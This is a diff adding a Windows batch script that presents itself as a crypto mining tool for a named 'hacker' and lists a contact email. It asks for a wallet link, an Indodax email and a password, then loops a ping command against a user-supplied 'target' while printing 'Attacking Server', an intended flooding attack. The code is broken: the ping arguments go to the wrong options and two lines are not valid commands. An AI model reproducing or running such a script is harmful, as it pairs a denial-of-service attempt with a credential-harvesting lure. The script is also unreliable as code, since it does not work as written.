@@ -1,0 +1,34 @@
+@echo off 
+mode 67,16
+title MINING For Hacker Vicky da Vinci
+color 0a
+cls
+echo.
+echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+echo Mining Dengan Ku :ainurvicky474@gmail.com
+echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+echo.
+set /p x=Link Dompet Digital:
+echo.
+Welcome.To.Indodax
+echo.
+set /p x=E-mail:
+echo.
+set /p x=Password:
+echo.
+Selamat.Datang.Tuan.Vicky.da.Vinci
+echo.
+goto Next
+:Next
+echo.
+echo.
+echo.
+set /p n=Link Target:
+echo.
+set /p m=Size Package:
+echo.
+:DDOS
+color 0d
+echo Attacking Server %n% %m%
+ping %m% -i %n% -t >nul
+goto DDOS
